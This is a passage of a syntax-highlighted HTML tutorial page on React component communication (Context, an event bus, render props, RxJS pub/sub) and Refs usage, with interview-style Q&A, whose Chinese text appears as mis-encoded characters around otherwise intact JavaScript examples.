class="hljs-name">MyContext.Provider</span>&gt;</span></span><br>);<br></code></pre></td></tr></table></figure><p><strong>å¤šå±‚ContextåµŒå¥—</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;<span class="hljs-title class_">UserContext</span>.<span class="hljs-property">Provider</span> value=&#123;user&#125;&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;theme&#125;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">LayoutContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;layout&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">AppContent</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">LayoutContext.Provider</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Provider</span>&gt;</span></span><br>&lt;/<span class="hljs-title class_">UserContext</span>.<span class="hljs-property">Provider</span>&gt;<br><br><span class="hljs-comment">// æ¶ˆè´¹æ—¶è‡ªåŠ¨åŒ¹é…æœ€è¿‘Provider</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Header</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> user = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">UserContext</span>);       <span class="hljs-comment">// è·å–user</span><br>  <span class="hljs-keyword">const</span> theme = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ThemeContext</span>);     <span class="hljs-comment">// è·å–theme</span><br>  <span class="hljs-keyword">const</span> layout = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">LayoutContext</span>);   <span class="hljs-comment">// è·å–layout</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="äº‹ä»¶æ€»çº¿ï¼ˆEvent-Busï¼‰æ¨¡å¼"><a href="#äº‹ä»¶æ€»çº¿ï¼ˆEvent-Busï¼‰æ¨¡å¼" class="headerlink" title="äº‹ä»¶æ€»çº¿ï¼ˆEvent Busï¼‰æ¨¡å¼"></a>äº‹ä»¶æ€»çº¿ï¼ˆEvent Busï¼‰æ¨¡å¼</h3><p><strong>å®ç°åŸç†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// eventBus.js</span><br><span class="hljs-keyword">const</span> events = &#123;&#125;;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  $on(eventName, fn) &#123;<br>    events[eventName] = events[eventName] || [];<br>    events[eventName].<span class="hljs-title function_">push</span>(fn);<br>  &#125;,<br>  <br>  $off(eventName, fn) &#123;<br>    <span class="hljs-keyword">if</span> (events[eventName]) &#123;<br>      events[eventName] = events[eventName].<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">f</span> =&gt;</span> f !== fn);<br>    &#125;<br>  &#125;,<br>  <br>  $emit(eventName, data) &#123;<br>    <span class="hljs-keyword">if</span> (events[eventName]) &#123;<br>      events[eventName].<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">fn</span> =&gt;</span> <span class="hljs-title function_">fn</span>(data));<br>    &#125;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>React ç»„ä»¶ä¸­ä½¿ç”¨</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç»„ä»¶Aï¼ˆå‘å¸ƒäº‹ä»¶ï¼‰</span><br><span class="hljs-keyword">import</span> eventBus <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./eventBus&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ComponentA</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleClick</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    eventBus.$emit(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-string">&#x27;æ•°æ®å†…å®¹&#x27;</span>);<br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;handleClick&#125;</span>&gt;</span>å‘é€<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;<br>&#125;<br><br><span class="hljs-comment">// ç»„ä»¶Bï¼ˆè®¢é˜…äº‹ä»¶ï¼‰</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ComponentB</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [msg, setMsg] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handler</span> = (<span class="hljs-params">data</span>) =&gt; <span class="hljs-title function_">setMsg</span>(data);<br>    eventBus.$on(<span class="hljs-string">&#x27;message&#x27;</span>, handler);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> eventBus.$off(<span class="hljs-string">&#x27;message&#x27;</span>, handler); <span class="hljs-comment">// æ¸…ç†</span><br>  &#125;, []);<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;msg&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é€‚ç”¨åœºæ™¯ä¸é£é™©</strong></p><table><thead><tr><th align="left">ä¼˜ç‚¹</th><th align="left">ç¼ºç‚¹</th><th align="left">é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left">è·¨ä»»æ„ç»„ä»¶é€šä¿¡</td><td align="left">ç ´åç»„ä»¶ç‹¬ç«‹æ€§</td><td align="left">å¾®å‰ç«¯æ¶æ„é€šä¿¡</td></tr><tr><td align="left">è§£è€¦æ€§å¼º</td><td align="left">éš¾ä»¥è¿½è¸ªæ•°æ®æµ</td><td align="left">éçˆ¶å­ç»„ä»¶ç®€å•äº¤äº’</td></tr><tr><td align="left">å®ç°ç®€å•</td><td align="left">å¯èƒ½å†…å­˜æ³„æ¼ï¼ˆæœªåŠæ—¶å–æ¶ˆè®¢é˜…ï¼‰</td><td align="left">ç¬¬ä¸‰æ–¹åº“äº‹ä»¶é€šçŸ¥</td></tr></tbody></table><h3 id="é«˜çº§é€šä¿¡æ¨¡å¼"><a href="#é«˜çº§é€šä¿¡æ¨¡å¼" class="headerlink" title="é«˜çº§é€šä¿¡æ¨¡å¼"></a>é«˜çº§é€šä¿¡æ¨¡å¼</h3><p><strong>çŠ¶æ€æå‡ + Context ç»„åˆ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åˆ›å»ºå…±äº«çŠ¶æ€ä¸Šä¸‹æ–‡</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">SharedStateContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(initialState);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">SharedStateContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">state</span>, <span class="hljs-attr">setState</span> &#125;&#125;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ComponentA</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ComponentB</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">SharedStateContext.Provider</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// ä»»æ„å­ç»„ä»¶æ¶ˆè´¹</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ComponentA</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; state, setState &#125; = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">SharedStateContext</span>);<br>  <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Render Props æ¨¡å¼</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ•°æ®æä¾›è€…</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DataProvider</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  state = &#123; <span class="hljs-attr">data</span>: <span class="hljs-literal">null</span> &#125;;<br>  <br>  <span class="hljs-title function_">componentDidMount</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">fetchData</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; data &#125;));<br>  &#125;<br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-title function_">children</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">data</span>); <span class="hljs-comment">// å…³é”®</span><br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// æ¶ˆè´¹ç»„ä»¶</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Consumer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">DataProvider</span>&gt;</span></span><br><span class="language-xml">      &#123;data =&gt; data ? <span class="hljs-tag">&lt;<span class="hljs-name">ShowData</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;data&#125;</span> /&gt;</span> : <span class="hljs-tag">&lt;<span class="hljs-name">Loading</span> /&gt;</span>&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">DataProvider</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è§‚å¯Ÿè€…æ¨¡å¼ï¼ˆPub&#x2F;Subï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä½¿ç”¨ç¬¬ä¸‰æ–¹åº“ (rxjs)</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Subject</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;rxjs&#x27;</span>;<br><br><span class="hljs-keyword">const</span> message$ = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Subject</span>();<br><br><span class="hljs-comment">// å‘å¸ƒ</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">publishMessage</span>(<span class="hljs-params">text</span>) &#123;<br>  message$.<span class="hljs-title function_">next</span>(text);<br>&#125;<br><br><span class="hljs-comment">// è®¢é˜…</span><br>message$.<span class="hljs-title function_">subscribe</span>(<span class="hljs-function"><span class="hljs-params">text</span> =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;æ”¶åˆ°æ¶ˆæ¯:&#x27;</span>, text);<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-4"><a href="#é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-4" class="headerlink" title="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ"></a>é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ</h3><p><strong>Q:ï¼šContext ä¸ Redux å¦‚ä½•é€‰æ‹©ï¼Ÿ</strong></p><pre class="mermaid">graph TDA[éœ€è¦å…¨å±€çŠ¶æ€?] -->|æ˜¯| B[çŠ¶æ€æ›´æ–°é¢‘ç‡é«˜?]A -->|å¦| C[ç”¨Props/çŠ¶æ€æå‡]B -->|æ˜¯| D[ç”¨Redux/Zustand]B -->|å¦| E[ç”¨Context API]</pre><p>å…³é”®åŒºåˆ«ï¼š</p><ul><li>Contextï¼šè½»é‡çº§ï¼Œé€‚åˆä½é¢‘æ›´æ–°ï¼ˆä¸»é¢˜&#x2F;ç”¨æˆ·ä¿¡æ¯ï¼‰</li><li>Reduxï¼šé‡é‡çº§ï¼Œé€‚åˆé«˜é¢‘æ›´æ–°+æ—¶é—´æ—…è¡Œè°ƒè¯•</li></ul><p><strong>Qï¼šå¦‚ä½•é¿å… Context æ€§èƒ½é—®é¢˜ï¼Ÿ</strong></p><ul><li>æ‹†åˆ† Contextï¼šæŒ‰ä¸šåŠ¡åˆ†ç¦»ï¼ˆç”¨æˆ·Context&#x2F;ä¸»é¢˜Contextï¼‰</li><li>ä½¿ç”¨ React.memoï¼šé˜²æ­¢æ— å…³ç»„ä»¶é‡æ¸²æŸ“</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Child</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-function">(<span class="hljs-params">&#123; nonContextProp &#125;</span>) =&gt;</span> &#123; ... &#125;);<br></code></pre></td></tr></table></figure><ul><li>é€‰æ‹©è®¢é˜…ï¼šä½¿ç”¨ use-context-selector åº“</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; useContextSelector &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;use-context-selector&#x27;</span>;<br><span class="hljs-keyword">const</span> theme = <span class="hljs-title function_">useContextSelector</span>(<span class="hljs-title class_">ThemeContext</span>, <span class="hljs-function"><span class="hljs-params">ctx</span> =&gt;</span> ctx.<span class="hljs-property">theme</span>);<br></code></pre></td></tr></table></figure><p><strong>Qï¼šäº‹ä»¶æ€»çº¿ä¼šå¯¼è‡´ä»€ä¹ˆé—®é¢˜ï¼Ÿ</strong></p><ul><li>å†…å­˜æ³„æ¼ï¼šç»„ä»¶å¸è½½æ—¶å–æ¶ˆè®¢é˜…</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handler</span> = (<span class="hljs-params"></span>) =&gt; &#123;...&#125;;<br>  bus.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;event&#x27;</span>, handler);<br>  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> bus.<span class="hljs-title function_">off</span>(<span class="hljs-string">&#x27;event&#x27;</span>, handler); <span class="hljs-comment">// âœ…</span><br>&#125;, []);<br></code></pre></td></tr></table></figure><ul><li>äº‹ä»¶å†²çªï¼šä½¿ç”¨å‘½åç©ºé—´</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">bus.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;moduleA:event&#x27;</span>, data);<br></code></pre></td></tr></table></figure><ul><li>è°ƒè¯•å›°éš¾ï¼šæ·»åŠ äº‹ä»¶æ—¥å¿—</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">emit</span>(<span class="hljs-params">event, data</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[Event] <span class="hljs-subst">$&#123;event&#125;</span>`</span>, data);<br>  <span class="hljs-comment">// ...åŸé€»è¾‘</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-5-Refs-ä½¿ç”¨åœºæ™¯ï¼ˆDOM-æ“ä½œã€forwardRefï¼‰"><a href="#2-5-Refs-ä½¿ç”¨åœºæ™¯ï¼ˆDOM-æ“ä½œã€forwardRefï¼‰" class="headerlink" title="2.5 Refs ä½¿ç”¨åœºæ™¯ï¼ˆDOM æ“ä½œã€forwardRefï¼‰"></a>2.5 Refs ä½¿ç”¨åœºæ™¯ï¼ˆDOM æ“ä½œã€forwardRefï¼‰</h2><h3 id="Refs-æ ¸å¿ƒæ¦‚å¿µå…¨æ™¯å›¾"><a href="#Refs-æ ¸å¿ƒæ¦‚å¿µå…¨æ™¯å›¾" class="headerlink" title="Refs æ ¸å¿ƒæ¦‚å¿µå…¨æ™¯å›¾"></a>Refs æ ¸å¿ƒæ¦‚å¿µå…¨æ™¯å›¾</h3><pre class="mermaid">graph TD  A[Refs ç±»å‹] --> B[å¯¹è±¡ Ref]  A --> C[å›è°ƒ Ref]  A --> D[å‡½æ•°ç»„ä»¶ useRef]    E[ä½¿ç”¨åœºæ™¯] --> F[è®¿é—® DOM èŠ‚ç‚¹]  E --> G[è®¿é—®ç±»ç»„ä»¶å®ä¾‹]  E --> H[å­˜å‚¨å¯å˜å€¼]  E --> I[é›†æˆç¬¬ä¸‰æ–¹åº“]    J[é«˜çº§ç‰¹æ€§] --> K[forwardRef è½¬å‘]  J --> L[useImperativeHandle æš´éœ²æ–¹æ³•]</pre><h3 id="ä¸‰å¤§-Refs-åˆ›å»ºæ–¹å¼"><a href="#ä¸‰å¤§-Refs-åˆ›å»ºæ–¹å¼" class="headerlink" title="ä¸‰å¤§ Refs åˆ›å»ºæ–¹å¼"></a>ä¸‰å¤§ Refs åˆ›å»ºæ–¹å¼</h3><p><strong>å¯¹è±¡ Refï¼ˆç±»ç»„ä»¶ï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AutoFocusInput</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  inputRef = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createRef</span>();  <span class="hljs-comment">// åˆ›å»º Ref å¯¹è±¡</span><br>  <br>  <span class="hljs-title function_">componentDidMount</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">inputRef</span>.<span class="hljs-property">current</span>.<span class="hljs-title function_">focus</span>();  <span class="hljs-comment">// è®¿é—® DOM èŠ‚ç‚¹</span><br>  &#125;<br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;this.inputRef&#125;</span> /&gt;</span></span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å›è°ƒ Refï¼ˆåŠ¨æ€åœºæ™¯ï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DynamicRef</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  setRef = <span class="hljs-function">(<span class="hljs-params">element</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (element) &#123;<br>      element.<span class="hljs-title function_">focus</span>();  <span class="hljs-comment">// å…ƒç´ æŒ‚è½½æ—¶æ‰§è¡Œ</span><br>    &#125;<br>  &#125;;<br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;this.setRef&#125;</span> /&gt;</span></span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>useRef Hookï¼ˆå‡½æ•°ç»„ä»¶ï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">FocusInput</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> inputRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);  <span class="hljs-comment">// åˆ›å»º Ref</span><br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    inputRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">focus</span>();  <span class="hljs-comment">// æŒ‚è½½åèšç„¦</span><br>  &#125;, []);<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;inputRef&#125;</span> /&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ ¸å¿ƒä½¿ç”¨åœºæ™¯æ·±åº¦è§£æ"><a href="#æ ¸å¿ƒä½¿ç”¨åœºæ™¯æ·±åº¦è§£æ" class="headerlink" title="æ ¸å¿ƒä½¿ç”¨åœºæ™¯æ·±åº¦è§£æ"></a>æ ¸å¿ƒä½¿ç”¨åœºæ™¯æ·±åº¦è§£æ</h3><p><strong>DOM æ“ä½œï¼ˆæ ¸å¿ƒåœºæ™¯ï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">VideoPlayer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> videoRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">play</span> = (<span class="hljs-params"></span>) =&gt; videoRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">play</span>();<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">pause</span> = (<span class="hljs-params"></span>) =&gt; videoRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">pause</span>();<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;videoRef&#125;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;movie.mp4&quot;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;play&#125;</span>&gt;</span>æ’­æ”¾<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;pause&#125;</span>&gt;</span>æš‚åœ<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å­˜å‚¨å¯å˜å€¼ï¼ˆä¸è§¦å‘é‡æ¸²æŸ“ï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Timer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">const</span> intervalRef = <span class="hljs-title function_">useRef</span>();  <span class="hljs-comment">// å­˜å‚¨è®¡æ—¶å™¨ ID</span><br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    intervalRef.<span class="hljs-property">current</span> = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">c</span> =&gt;</span> c + <span class="hljs-number">1</span>);<br>    &#125;, <span class="hljs-number">1000</span>);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearInterval</span>(intervalRef.<span class="hljs-property">current</span>);<br>  &#125;, []);<br>  <br>  <span class="hljs-comment">// åœæ­¢è®¡æ—¶å™¨ï¼ˆä¸ä¾èµ– stateï¼‰</span><br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">stop</span> = (<span 